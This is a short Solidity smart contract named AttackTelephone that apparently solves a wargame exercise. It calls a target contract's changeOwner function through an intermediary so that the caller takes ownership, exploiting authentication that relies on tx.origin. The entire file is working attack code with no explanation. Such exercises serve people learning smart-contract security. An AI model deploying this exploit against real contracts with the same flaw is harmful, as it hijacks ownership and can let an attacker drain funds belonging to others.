// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    TelephoneInterface public telephone;

    constructor(address _telephone) {
        telephone = TelephoneInterface(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}